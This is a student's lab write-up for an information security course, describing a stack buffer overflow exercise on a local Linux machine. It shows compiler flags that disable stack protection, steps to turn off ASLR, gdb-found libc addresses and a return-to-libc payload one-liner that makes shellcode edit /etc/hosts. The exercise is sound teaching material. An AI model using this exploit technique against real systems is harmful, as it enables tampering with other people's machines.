# Lab #1,21110058, CAO KHẢI MINH, INSE330380E_02FIE

# Task 1: **Software buffer overflow attack**
**Question 1**: Compile asm program and C program to executable code. 

\- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is  added to the /etc/hosts file on your linux. 

 You are free to choose Code Injection or Environment Variable approach to do. 

\- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.

## **I. Set up the C program:**

### 1. Create a C file named `vuln.c`:
```sh
nano vuln.c
```
![image-20241104091628712](./SecLab/image-20241104091628712.png)<br>

After which use `crtl` +` o` to save ad `crtl`+`x` to exit.

### 3. Compile the newly written C file with `gcc`:

```sh
gcc vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2
```

</br>

## **II. Set up the NASM program:**

### 1. Create a NASM file named `lab1.nasm`:

```sh
nano attackCode.nasm
```

<img width="500" alt="Screenshot" src="https://github.com/CKMPeter/Information-Sec/blob/main/SecLab/attackCode.png?raw=true"><br>

After which use `crtl` +` o` to save ad `crtl`+`x` to exit.

### 2. **Compile and Link the newly written NASM file**:

#### a. Compile the file:

```sh
nasm -f elf32 -o lab1.o lab1.nasm
```

**`-f elf32`**: This flag specifies the output format. In this case, it's generating a 32-bit **ELF**

**`-o attackCode.o`**: This specifies the output file's name. The resulting object file will be named `attackCode.o`

</br>

#### b. Link the file to an executable:

```sh
ld -m elf_i386 -o lab1 lab1.o
```
</br>

## III. EXECUTE THE ATTACK:

### 1. turn off ASLR (Address Space Layout Randomization):

![image-20241104092449640](./SecLab/image-20241104092449640.png)

### 2. create an environment variable in Linux with the path of file lab1.asm:

![image-20241104092724884](./SecLab/image-20241104092724884.png)

### 3. use gdb:

![image-20241104093358327](./SecLab/image-20241104093358327.png)

0xf7e50db0: Address of libc_system
0xf7e449e0: Address of exit to avoid crashing
0xffffd939: Address of env variable

### 4. Attack File:

```sh
r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x39\xd9\xff\xff')")
```

![image-20241104095520665](./SecLab/image-20241104095520665.png)

after doing, so you would use

```
sudo cat /etc/hosts 
```

to see the newly added host.
